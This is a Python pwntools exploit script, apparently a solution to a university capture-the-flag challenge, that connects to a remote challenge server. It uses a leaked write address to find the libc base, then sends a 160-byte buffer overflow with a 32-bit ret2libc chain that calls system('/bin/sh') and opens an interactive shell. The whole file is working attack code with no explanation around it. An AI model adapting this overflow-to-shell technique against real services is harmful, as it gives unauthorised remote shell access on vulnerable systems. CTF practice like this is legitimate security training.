from pwn import *

r = remote('ctf99x.cs.ui.ac.id', 10003)
# r = process('./soal3.bin')

r.recvuntil('write the following address: ')
address = int(r.recv(10),16)

libc = ELF('./libc-2.27.so')
system_offset = libc.symbols['system']
binsh_offset = list(libc.search(b'/bin/sh'))[0]
write_offset = libc.symbols['write']

print(hex(write_offset), 'write offset')
print(hex(address), 'write address')

# PUT_ADDR = int(leak, 16)
LIBC_BASE = address - write_offset
print(hex(LIBC_BASE), 'libc address')


# 0x0001869b : pop edi ; ret 
pop_edi = LIBC_BASE + 0x0001869b
print(hex(pop_edi), 'pop address')
system_address = LIBC_BASE + system_offset
binsh_address = LIBC_BASE + binsh_offset

print(hex(system_address), 'system address')
print(hex(binsh_address), 'binsh address')

payload = b'A'*160
payload += p32(system_address)
payload += p32(pop_edi)
payload += p32(binsh_address)

r.sendline(payload)

r.interactive()